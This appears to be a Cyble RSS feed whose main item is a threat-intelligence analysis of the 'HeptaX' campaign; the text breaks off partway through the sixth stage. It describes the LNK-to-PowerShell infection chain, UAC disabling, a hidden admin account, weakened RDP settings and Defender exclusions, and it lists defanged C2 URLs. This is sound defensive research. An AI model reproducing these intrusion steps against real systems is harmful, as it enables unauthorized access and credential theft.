<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>Cyble</title>
<link>https://cyble.com</link>

<item>
<title>New tool bypasses Google Chrome’s new cookie encryption system</title>
<link>https://www.bleepingcomputer.com/news/security/new-tool-bypasses-google-chromes-new-cookie-encryption-system/</link>
<guid>https://www.bleepingcomputer.com/news/security/new-tool-bypasses-google-chromes-new-cookie-encryption-system/</guid>
<content:encoded><![CDATA[

A researcher has released a tool to bypass Google's new App-Bound encryption cookie-theft defenses and extract saved credentials from the Chrome web browser. [...]
]]></content:encoded>
<pubDate>Mon, 28 Oct 2024 16:59:28 -0400</pubDate>
<pubDate>Mon, 28 Oct 2024 16:59:28 -0400</pubDate>
</item>

<item>
<title>Lazarus Group Exploits Chrome Zero-Day Flaw Via Fake NFT Game</title>
<link>https://www.cysecurity.news/2024/10/lazarus-group-exploits-chrome-zero-day.html</link>
<guid>https://www.cysecurity.news/2024/10/lazarus-group-exploits-chrome-zero-day.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg96lCFoToH01YALCJ0QbbzXbZQezXM88EDzH9jF95Fot4MctryUG3IoSQnWPHKo8Zn_1PBrKf0ESWYSSGydWQ62CJYAGkSRHynAJXUwYgqnWitKzGAYtdARh3SFlxcjGj5czg6lJ-1zdEmPxkfU2jMqSXfph4GHGAa2V-FERq3zxGoKGcokgwz30iQFXI/s6135/1269.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg96lCFoToH01YALCJ0QbbzXbZQezXM88EDzH9jF95Fot4MctryUG3IoSQnWPHKo8Zn_1PBrKf0ESWYSSGydWQ62CJYAGkSRHynAJXUwYgqnWitKzGAYtdARh3SFlxcjGj5czg6lJ-1zdEmPxkfU2jMqSXfph4GHGAa2V-FERq3zxGoKGcokgwz30iQFXI/s600/1269.jpg" width="600" /></a></div><span style="font-family: inherit;"><div style="text-align: justify;"><span style="font-family: inherit;">The notorious North Korean hacking outfit dubbed Lazarus  has launched a sophisticated attack campaign targeting cryptocurrency investors.  This campaign, discovered by Kaspersky researchers, consists of a multi-layered assault chain that includes social engineering, a fake game website, and a zero-day flaw in Google Chrome.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">The report claims that in May 2024, Kaspersky Total Security identified a new attack chain that used the Manuscrypt backdoor to target the personal computer of an unidentified Russian citizen.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Kaspersky researchers Boris Larin and Vasily Berdnikov believe the campaign began in February 2024. After investigating the attack further, analysts discovered that the attackers had developed a website called "detankzonecom" that seemed to be a genuine platform for the game "DeFiTankZone."&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">This game reportedly combines Decentralised Finance (DeFi) elements with Non-Fungible Tokens (NFTs) in a Multiplayer Online Battle Arena (MOBA) situation. The website even offers a downloadable trial edition, adding to the look of trustworthiness. However, beneath the surface is a malicious trap.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">“Under the hood, this website had a hidden script that ran in the user’s Google Chrome browser, launching a zero-day exploit and giving the attackers complete control over the victim’s PC,” researchers noted.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">The exploit contains code for two vulnerabilities: one that enables hackers to access the whole address space of the Chrome process using JavaScript (CVE-2024-4947), and the other that allows attackers to circumvent the V8 sandbox and access memory outside the confines of the register array.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Google addressed CVE-2024-4947, a type confusion flaw in the V8 JavaScript and WebAssembly engine, in March 2024, although it's unknown if attackers discovered it first and weaponised it as a zero-day or exploited it as an N-day flaw.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">In this campaign, Lazarus has used social media sites like LinkedIn and X (previously Twitter) to target prominent players in the cryptocurrency field. With several accounts on X, they created a social media presence and actively promoted the fake game. They also hired graphic designers and generative AI to create amazing advertising material for the DeTankZone game. The group also sent carefully designed messages to interested parties pretending to be blockchain startups or game developers looking for funding.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">This campaign highlights how the Lazarus Group's strategies have changed. It is crucial to be wary of unsolicited investment opportunities, particularly when they involve dubious social media promotions or downloadable game clients. In order to mitigate the risk of zero-day attacks, it is also crucial to maintain browser software, such as Chrome, updated with the most recent security fixes.</span></div></span>
]]></content:encoded>
<pubDate>2024-10-26T10:59:44.873-04:00</pubDate>
</item>
<item>
<title>HeptaX: Unauthorized RDP Connections for Cyberespionage Operations</title>
<link>https://cyble.com/blog/heptax-unauthorized-rdp-connections-for-cyberespionage-operations/</link>
<guid>https://cyble.com/blog/heptax-unauthorized-rdp-connections-for-cyberespionage-operations/</guid>
<content:encoded><![CDATA[
<p><img alt="HeptaX" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/10/CybleBlogs-.png" tabindex="0" title="HeptaX: Unauthorized RDP Connections for Cyberespionage Operations 1" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key takeaways</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Cyble Research and Intelligence Labs (CRIL) came across an ongoing cyberattack campaign originating from malicious LNK files.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The sophisticated multi-stage attack chain relies heavily on PowerShell and BAT scripts to streamline the download and execution of additional payloads, demonstrating the Threat Actor’s (TA) preference for script-based methods to evade detection by traditional security solutions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The attack involves the creation of an administrative account on the victim’s system and altering Remote Desktop settings to lower authentication requirements, simplifying unauthorized RDP access for the attacker.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The campaign deploys an additional well-known password recovery tool, ChromePass, which collects saved passwords from Chromium-based browsers, increasing the risk of broader account compromises.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Based on its TTPs, we have not been able to attribute this campaign, so for tracking purposes, we are naming it "HeptaX".</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>CRIL has come across a multi-stage cyberattack <a href="https://www.virustotal.com/gui/file/18e75bababa1176ca1b25f727c0362e4bb31ffc19c17e2cabb6519e6ef9d2fe5/community">campaign</a> that begins with a ZIP file containing a malicious shortcut file (.lnk). While the source of this ZIP file remains unknown, it is suspected to be disseminated through phishing emails. Based on the LNK <a href="https://www.virustotal.com/gui/file/5ff89db10969cba73d1f539b12dad42c60314e580ce43d7b57b46a1f915a6a2b/details">file name</a>, it is suspected that this campaign targets the healthcare industry.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Upon execution, the LNK file triggers a PowerShell command that downloads and executes a series of additional payloads, including PowerShell scripts and BAT files, from a remote server. These scripts work in tandem to create a new user account on the compromised system with administrative privileges and modify Terminal Services (RDP) settings, lowering authentication requirements. This setup enables the TAs to easily establish remote desktop access (RDP) to the victim's system, facilitating further malicious activities such as data exfiltration, the installation of additional <a href="https://cyble.com/knowledge-hub/what-is-malware/">malware</a>, or even system monitoring.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Furthermore, CRIL identified the presence of an unwanted application called “ChromePass” within the threat actors' network infrastructure. This hacking tool is designed to steal saved passwords from Chromium-based browsers, adding another layer of risk for victims by exposing their credentials. The image below illustrates the infection chain.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69352,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Infection Chain, Malware, HeptaX" class="wp-image-69352" src="https://cyble.com/wp-content/uploads/2024/10/Figure-1-Infection-chain-1.png" /><figcaption class="wp-element-caption">Figure 1 - Infection chain</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Based on the information obtained through pivoting, this group has been operational since 2023&nbsp;and has executed a range of <a href="https://cyble.com/knowledge-hub/what-is-a-cyber-attack/">attacks</a> across different sectors, as reflected in the names of the lure files. While the overall attack flow has remained consistent, it is surprising that they are still active using the same techniques. Several researchers have previously identified this campaign <a href="https://x.com/malwrhunterteam/status/1701669714244542758">[1]</a>,<a href="https://x.com/AzakaSekai_/status/1846482785009348692">[2]</a>,<a href="https://x.com/fmc_nan/status/1701427951714345296">[3]</a>,<a href="https://x.com/malwrhunterteam/status/1708219656488571188">[4]</a>,<a href="https://x.com/malwrhunterteam/status/1701672325580550176">[5]</a>, with the majority of findings shared by the Malware Hunter Team.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Campaign analysis</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>Over the past 12 months, this unidentified group has consistently reemerged with various lure themes while maintaining unchanged attack patterns. Tracked as HeptaX,' the campaign relies heavily on PowerShell and Batch scripts to gain control over compromised systems. By pivoting the IP address, we uncovered several additional artifacts associated with the same TAs used across different campaigns.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69358,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Phishing, Lure document
" class="wp-image-69358" src="https://cyble.com/wp-content/uploads/2024/10/Figure-2-–-Project-Description-PoC-smart-assistant-Vhyro-Project-from-jvope-signature.pdf-lure-doc-Observed-in-Oct-2023.png" /><figcaption class="wp-element-caption">Figure 2 – Project Description - PoC smart assistant Vhyro Project from jvope signature.pdf (lure doc observed in Oct 2023)</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69361,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Blockchain, Phishing, Lure document" class="wp-image-69361" src="https://cyble.com/wp-content/uploads/2024/10/Figure-3-Blockchain_Trading_Website_Manager.docx-lure-file-observed-in-Sept-2023.png" /><figcaption class="wp-element-caption">Figure 3 - Blockchain_Trading_Website_Manager.docx (lure file observed in Sept 2023)</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69362,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Phishing, Lure" class="wp-image-69362" src="https://cyble.com/wp-content/uploads/2024/10/Figure-4-WebContentWriting_Handout.pdf-lure-observed-in-Oct-2023.png" /><figcaption class="wp-element-caption">Figure 4 - WebContentWriting_Handout.pdf (lure observed in Oct 2023)</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69363,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Social Engineering, Phishing" class="wp-image-69363" src="https://cyble.com/wp-content/uploads/2024/10/Figure-5-Resume-professional-sax-keys-and-guitar-player-with-over-40-years-experience-working-with-own-bands-accompanied-world-stars.pdf-lure-observed-in-Nov-2023.png" /><figcaption class="wp-element-caption">Figure 5 - Resume - professional sax, keys, and guitar player with over 40 years experience working with own bands, accompanied world stars.pdf (lure observed in Nov 2023)</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69365,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Social Engineering, SOW" class="wp-image-69365" src="https://cyble.com/wp-content/uploads/2024/10/Figure-6-SOW_for_Nevrlate.pdf-lure-file-Observed-in-Nov-2023.png" /><figcaption class="wp-element-caption">Figure 6 - SOW_for_Nevrlate.pdf (lure file Observed in Nov 2023)</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>One of the notable files from this campaign is:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><em>202409_Resident_Care_Quality_Improvement_Strategies_for_Nursing_Homes_Enhancing_Patient_Satisfaction_and_Health_Outcomes.pdf.lnk</em></li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>In addition, older campaigns attributed to this threat group over the past year include malicious files with names such as:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><em>SOW_for_Nevrlate.pdf</em></li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><em>WebContentWriting_Handout.pdf</em></li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><em>Blockchain_Trading_Website_Manager.docx</em></li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><em>Project Description - PoC smart assistant Vhyro Project from jvope signature.pdf</em></li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><em>Resume - professional sax, keys and guitar player with over 40 years experience working with own bands, accompanied world stars.pdf</em></li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><em>dropshipping Elien project prposal-soft online service ventilization from xihu.pdf.lnk</em></li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>The diversity in file names and themes suggests that this group tailors its campaigns to appeal to a variety of victims, indicating a broad targeting strategy across multiple industries.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Technical Analysis</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p>&nbsp;Upon execution, the LNK file runs a PowerShell command that downloads and executes subsequent payloads from a remote server. The image below shows a partially de-obfuscated PowerShell command.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69366,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="PowerShell, COde" class="wp-image-69366" src="https://cyble.com/wp-content/uploads/2024/10/Figure-7-De-Obfuscated-PowerShell-Code.png" /><figcaption class="wp-element-caption">Figure 7 - De-Obfuscated PowerShell Code</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>First stage – bb.ps1</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>As an initial step, the downloaded PowerShell script constructs a base URL to which it sends information and from which it downloads other stage payloads. The PowerShell script contains multiple functions, the first of which retrieves a unique identifier (UID) for the compromised system. This UID is obtained either from a specific registry path (HKEY_LOCAL_MACHINE\SOFTWARE\Wireless) or from a log file (<em>id.log</em>) in the <em>“C:\Users\Public\Documents</em>” directory. If neither exists, a new GUID is generated and saved to a newly created id.log file.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69368,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="UID Generation" class="wp-image-69368" src="https://cyble.com/wp-content/uploads/2024/10/Figure-8-UID-Generation.png" /><figcaption class="wp-element-caption">Figure 8 - UID Generation</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Next, the PowerShell script creates a shortcut file in the Windows Startup folder for persistence. The contents of the newly generated LNK file match those of the original malicious LNK file. The image below shows the function responsible for creating the new LNK file in the startup folder.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69369,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Persistence" class="wp-image-69369" src="https://cyble.com/wp-content/uploads/2024/10/Figure-9-Shortcut-Creation-for-Persistence.png" /><figcaption class="wp-element-caption">Figure 9 - Shortcut Creation for Persistence</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Then, the PowerShell script constructs a URL by appending the previously generated UID to the remote server, forming the request <em>hxxp://157.173.104.153/up/get-command.php?uid=&lt;UID</em>&gt;, and uses <em>WebClient</em> to send a request to fetch commands from the server. Upon receiving a successful response, it checks whether the response contains the string “autoreconnect”. If this string is present, the Powershell script runs the code in the current session using `iex`; otherwise, it executes the code as a background task in a separate PowerShell process.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69370,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Command-and-control, Commands" class="wp-image-69370" src="https://cyble.com/wp-content/uploads/2024/10/Figure-10-Fetching-commands-from-the-command-and-control-server.png" /><figcaption class="wp-element-caption">Figure 10 - Fetching commands from the command-and-control server</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Afterward, the PowerShell script downloads a password-protected lure document from the above-mentioned remote server, saves it in the system's temporary directory “<em>C:\Users\&lt;Username&gt;\AppData\Local\Temp</em>”, and then launches the document. The image below displays the function code and the open directory containing the lure PDF.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69372,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Code, Lure Document" class="wp-image-69372" src="https://cyble.com/wp-content/uploads/2024/10/Figure-11-Code-to-download-and-launch-lure-document.png" /><figcaption class="wp-element-caption">Figure 11 - Code to download and launch lure document</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69373,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Open Directory, Phishing" class="wp-image-69373" src="https://cyble.com/wp-content/uploads/2024/10/Figure-12-Open-directory-containing-lure-PDF.png" /><figcaption class="wp-element-caption">Figure 12 - Open directory containing lure PDF</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Finally, the PowerShell script retrieves two registry values related to User Account Control (UAC):</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin, which controls the consent prompt behavior for administrators.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA, which indicates whether UAC is enabled.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>If either of these values is 0, suggesting that UAC is either disabled or configured to a less secure setting, the script proceeds to download and execute another PowerShell script (<em>b.ps1</em>) from the remote server.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69375,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Payload, Code" class="wp-image-69375" src="https://cyble.com/wp-content/uploads/2024/10/Figure-13-Code-to-download-next-stage-payload.png" /><figcaption class="wp-element-caption">Figure 13 - Code to download next stage payload</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Second Stage – b.ps1</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The newly downloaded second-stage PowerShell script includes several functions, some mirroring those from the first stage. The primary function of this script is focused on evaluating the system's User Account Control (UAC) settings, utilizing the same registry checks employed earlier to determine whether UAC is enabled and if the consent prompt for administrators remains active.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>If UAC is disabled or the consent prompt behavior is configured to a less secure state, the function sends a message to the remote server indicating that UAC is off by default: ("hxxp://157.173.104[.]153/up/index.php?uid=$uid&amp;msg=UAC off in default!").</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>If both settings are enabled, the function enters a loop, repeatedly attempting to disable UAC by setting the “ConsentPromptBehaviorAdmin” value to 0. Once successful, it sends a message to the remote server stating that UAC has been forcefully disabled: ("hxxp://157.173.104[.]153/up/index.php?uid=$uid&amp;msg=UAC force disabled!"). The below image shows the function code responsible for sending a POST request to the remote server, transmitting information about the victim's User Account Control (UAC) status.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69376,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="C2, UAC" class="wp-image-69376" src="https://cyble.com/wp-content/uploads/2024/10/Figure-14-Code-for-sending-a-POST-request-to-the-CC-server-with-the-victims-UAC-status.png" /><figcaption class="wp-element-caption">Figure 14 - Code for sending a POST request to the C&amp;C server with the victim's UAC status</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>After a brief 300-millisecond sleep, the PowerShell script calls the <em>schReg()</em> function, which downloads three batch files from the remote server into the system’s temporary directory ($env:TEMP). The files are named “<em>k1.bat</em><span style="margin: 0px; padding: 0px;">,” “<em>scheduler-once.bat</em>,” and “<em>k2.bat</em>.” After downloading, the script runs the “<em>scheduler-once.bat”</em> file using the “Start-Process” cmdlet with elevated privileges. The image below shows the code responsible for downloading and executing the batch files</span>.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69377,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="" class="wp-image-69377" src="https://cyble.com/wp-content/uploads/2024/10/Figure-15-Code-for-downloading-and-running-batch-file.png" /><figcaption class="wp-element-caption">Figure 15 - Code to download and run batch file</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Third Stage - scheduler-once.bat</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The executed batch file copies “<em>k1.bat</em>” and “<em>k2.bat”</em> from the %temp% directory to “<em>C:\Windows\System32”</em>, renaming them to “<em>sysmon.bat”</em> and “<em>sysmon2.bat”</em>. It then deletes the original “<em>k1.bat”</em> and “<em>k2.bat”</em> files from the temp location. Next, the batch file checks for and removes any scheduled tasks named:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Intel(R) Ethernet Connection 1219-LM</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Intel(R) Ethernet2 Connection 1219-LM</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>Afterward, it creates a new scheduled task called "Intel(R) Ethernet2 Connection 1219-LM" to run “<em>sysmon2.bat”</em>. Finally, the script “<em>scheduler-once.bat</em>” deletes itself to cover its traces from the system. The image below displays the contents of the batch file “<em>scheduler-once.bat”</em>.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69379,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Batch file" class="wp-image-69379" src="https://cyble.com/wp-content/uploads/2024/10/Figure-16-Content-of-scheduler-once.bat_.png" /><figcaption class="wp-element-caption">Figure 16 - Contents of the scheduler-once.bat file</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Fourth Stage – sysmon2.bat</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Once the scheduled task is triggered to execute the “<em>sysmon2.bat”</em> file, it first checks for and removes any existing scheduled tasks named:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Intel(R) Ethernet Connection 1219-LM2</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Intel(R) Ethernet2 Connection 1219-LM2</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:paragraph --></p>
<p>Afterward, it creates a new scheduled task called “Intel(R) Ethernet2 Connection1219-LM2” to run the “<em>sysmon.bat”</em> file located in the “C:<em>Windows\System32”</em> folder. Notably, the previous third-stage batch file performs similar checks, but the task names differ slightly. The image below shows the content of the&nbsp;“<em>sysmon2.bat”</em> file.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:image {"id":69380,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Sysmon2, analysis" class="wp-image-69380" src="https://cyble.com/wp-content/uploads/2024/10/Figure-17-Content-of-sysmon2-file.png" /><figcaption class="wp-element-caption">Figure 17 - Contents of the sysmon2 file</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Fifth Stage – Sysmon.bat</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The sysmon.bat script executes a series of actions:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Creates a new user account named “_<em>BootUEFI_</em>”.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Sets the password for this newly added account to “123456!!!” and activates it.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Adds the “_<em>BootUEFI_”</em> account to the Administrators group, granting it administrative privileges.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Adds the “_<em>BootUEFI_”</em> account to the Remote Desktop Users group, allowing it to utilize Remote Desktop.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Removes the “_<em>BootUEFI_”</em> account from the Users group, ensuring it retains only administrative and remote desktop privileges.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Additionally, the batch file makes several registry modifications to enable Remote Desktop and lower its security features. This includes hiding the “<strong>_</strong><em>BootUEFI<strong>_”</strong></em> user from the login screen and adjusting Terminal Services (Remote Desktop) settings to facilitate easier remote connections without stringent authentication requirements.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>The batch file runs a PowerShell command that circumvents execution policy restrictions and adds the System32 directory, which contains the three malicious batch files, to the Windows Defender exclusion list.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Finally, it initiates a background PowerShell process that downloads and executes another PowerShell script from the remote server (hxxp://157.173.104[.]153/up/a.ps1).</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:image {"id":69382,"sizeSlug":"full","linkDestination":"none","align":"center"} --></p>
<figure class="wp-block-image aligncenter size-full"><img alt="Batch File, Analysis" class="wp-image-69382" src="https://cyble.com/wp-content/uploads/2024/10/Figure-18-Contents-of-sysmon.bat-file.png" /><figcaption class="wp-element-caption">Figure 18 - Contents of the sysmon.bat file</figcaption></figure>
<p><!-- /wp:image --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>Sixth Stage – a.ps1</strong></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>The newly downloaded PowerShell script “<em>a.ps1”</em> functions similar to the first stage script (<em>bb.ps1</em>). It constructs a URL by appending the previously generated UID to the remote server address, forming a request to “<em>hxxp://157.173.104.153/up/get-command.php?uid=&lt;UID&gt;”</em>.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
